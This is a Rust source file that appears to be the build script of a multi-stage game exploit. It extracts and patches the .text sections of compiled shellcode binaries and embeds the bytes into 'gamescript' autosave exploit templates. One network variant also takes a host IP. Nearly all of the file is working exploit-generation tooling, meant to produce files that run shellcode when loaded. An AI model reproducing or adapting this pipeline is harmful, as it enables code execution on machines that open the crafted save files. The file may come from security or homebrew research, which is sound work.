use anyhow::Result;
use goblin::pe::PE;
use iced_x86::Decoder;
use iced_x86::DecoderOptions;
use iced_x86::Formatter;
use iced_x86::Instruction;
use iced_x86::NasmFormatter;
use itertools::Itertools;
use std::fs::File;
use std::io::prelude::*;
use std::io::BufWriter;
use std::path::Path;
use std::path::PathBuf;
use std::process::Command;

fn main() -> Result<()> {
    let args: Vec<String> = std::env::args().collect();
    let output_path = Path::new(args[1].as_str());

    let stage1_path =
        "..\\shellcode_stage1\\target\\x86_64-pc-windows-msvc\\release\\shellcode_stage1.exe";

    let stage1_output = rewrite_shellcode(stage1_path)?;

    let stage1_network_path =
        "..\\shellcode_stage1_network\\target\\x86_64-pc-windows-msvc\\release\\shellcode_stage1_network.exe";

    let stage1_network_output = rewrite_shellcode(stage1_network_path)?;

    let stage2_path =
        "..\\shellcode_stage2\\target\\x86_64-pc-windows-msvc\\release\\shellcode_stage2.exe";
    let stage2_output = rewrite_shellcode(stage2_path)?;

    // generate the exploit code to load the stage1 code
    let gamescript_exploit = generate_gamescript_exploit(&stage1_output)?;

    // generate the exploit code to load the stage1 network code
    let gamescript_network_exploit = generate_network_gamescript_exploit(&stage1_network_output)?;

    if !output_path.exists() {
        std::fs::create_dir(output_path)?;
    }

    let gs_path = output_path.join("gamescript_autosave.txt");
    std::fs::write(gs_path, gamescript_exploit.as_bytes())?;

    let gs_network_path = output_path.join("gamescript_autosave_network.txt");
    std::fs::write(gs_network_path, gamescript_network_exploit.as_bytes())?;

    std::fs::copy(stage1_output, output_path.join("stage1.bin"))?;
    std::fs::copy(
        stage1_network_output,
        output_path.join("stage1_network.bin"),
    )?;
    std::fs::copy(stage2_output, output_path.join("stage2.bin"))?;

    println!("done! artifacts can be found in outputs/");

    Ok(())
}

// Patch the prologue of the shellcode to rewrite the load offsets
pub fn rewrite_shellcode(src_path: &str) -> Result<PathBuf> {
    println!("[*] Patching shellcode for file {src_path}");

    let mut file = File::open(src_path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;

    // Parse the PE and adjust load address
    let pe = PE::parse(&mut buffer)?;
    let standard_fields = pe.header.optional_header.unwrap().standard_fields;
    let entry_offset = standard_fields.address_of_entry_point - standard_fields.base_of_code;

    // Take the input filename and make the output file the same name,
    // but with .bin extension
    let mut dst_path = PathBuf::from(src_path);
    dst_path.set_extension("bin");

    // Flatten the sections together
    for section in pe.sections {
        let name = String::from_utf8(section.name.to_vec())?;
        if !name.starts_with(".text") {
            continue;
        }
        let start = section.pointer_to_raw_data as usize;
        // we use virtual size instead of raw size to remove any padding data
        let size = section.virtual_size as usize;

        let shellcode = File::create(&dst_path)?;
        let mut buf_writer = BufWriter::new(shellcode);
        println!("[*] section text addr: 0x{:x}, size: 0x{:x}", start, size);
        println!("[*] entry offset: 0x{:x}", entry_offset);
        println!("== before patch ==");
        show_disassemble(&buffer[start..start + size], 5);
        if entry_offset >= 0x100 {
            buffer[0 + start] = 0xe9;
            let hi = (entry_offset - 2) / 0x100;
            let li = (entry_offset - 2) % 0x100;
            dbg!(hi, li);
            buffer[1 + start] = li as _;
            buffer[2 + start] = hi as _;
            buffer[3 + start] = 0 as _;
            buffer[4 + start] = 0 as _;
        } else if entry_offset >= 0x80 {
            buffer[0 + start] = 0xe9;
            buffer[1 + start] = (entry_offset - 5) as _;
            buffer[2 + start] = 0 as _;
            buffer[3 + start] = 0 as _;
            buffer[4 + start] = 0 as _;
        } else {
            buffer[0 + start] = 0xeb;
            buffer[1 + start] = (entry_offset - 2) as _;
        }
        println!("== after patch ==");
        show_disassemble(&buffer[start..start + size], 5);

        buf_writer.write_all(&buffer[start..start + size])?;
        buf_writer.flush().unwrap();
    }

    Ok(dst_path)
}

pub fn show_disassemble(bytes: &[u8], max_line: u32) {
    let mut decoder = Decoder::new(EXAMPLE_CODE_BITNESS, bytes, DecoderOptions::NONE);
    decoder.set_ip(EXAMPLE_CODE_RIP);
    let mut formatter = NasmFormatter::new();
    formatter.options_mut().set_digit_separator("`");
    formatter.options_mut().set_first_operand_char_index(10);
    let mut output = String::new();
    let mut instruction = Instruction::default();
    let mut i = 0;
    while decoder.can_decode() {
        i += 1;
        if i > max_line {
            println!("....\n");
            break;
        }
        decoder.decode_out(&mut instruction);
        output.clear();
        formatter.format(&instruction, &mut output);
        print!("{:016X} ", instruction.ip());
        let start_index = (instruction.ip() - EXAMPLE_CODE_RIP) as usize;
        let instr_bytes = &bytes[start_index..start_index + instruction.len()];
        for b in instr_bytes.iter() {
            print!("{:02X}", b);
        }
        if instr_bytes.len() < HEXBYTES_COLUMN_BYTE_LENGTH {
            for _ in 0..HEXBYTES_COLUMN_BYTE_LENGTH - instr_bytes.len() {
                print!("  ");
            }
        }
        println!(" {}", output);
    }
}

const HEXBYTES_COLUMN_BYTE_LENGTH: usize = 10;
const EXAMPLE_CODE_BITNESS: u32 = 64;
const EXAMPLE_CODE_RIP: u64 = 0x0000_0001_4000_1000; // 0000 0001 4000 1000

fn generate_gamescript_exploit(shellcode_path: &Path) -> anyhow::Result<String> {
    // Use decimal encoding to produce a smaller script. Decimal is at most 3
    // chars while hex is at min 3, at most 5.
    let shellcode_data: String = std::fs::read(shellcode_path)?
        .iter()
        .map(|b| format!("{}", *b))
        .intersperse(",".to_string())
        .collect();

    let exploit_data = include_str!("../gs_exploit_template.txt");

    Ok(exploit_data.replace("<SHELLCODE_GEN_PLZ_REPLACE_ME>", &shellcode_data))
}

fn generate_network_gamescript_exploit(shellcode_path: &Path) -> anyhow::Result<String> {
    // Use decimal encoding to produce a smaller script. Decimal is at most 3
    // chars while hex is at min 3, at most 5.
    let shellcode_data: String = std::fs::read(shellcode_path)?
        .iter()
        .map(|b| format!("{}", *b))
        .intersperse(",".to_string())
        .collect();

    let exploit_data = include_str!("../gs_exploit_template_network.txt");
    let commit: String = String::from_utf8(
        Command::new("git")
            .arg("rev-parse")
            .arg("HEAD")
            .output()
            .expect("failed to get `git rev-parse` output")
            .stdout,
    )
    .expect("failed to parse `git rev-parse` output");

    let commit = commit.trim();

    let commit_date: String = String::from_utf8(
        Command::new("git")
            .arg("show")
            .arg("--no-patch")
            .arg("--format=%ci")
            .arg(&commit)
            .output()
            .expect("failed to get `git show` output")
            .stdout,
    )
    .expect("failed to parse `git show` output");

    let commit_date = commit_date.trim();

    Ok(exploit_data
        .replace("<SHELLCODE_GEN_PLZ_REPLACE_ME>", &shellcode_data)
        .replace("<HOST_IP>", &include_str!("../../../host_ip.txt"))
        .replace("<GIT_VERSION>", &commit)
        .replace("<GIT_DATE>", &commit_date))
}
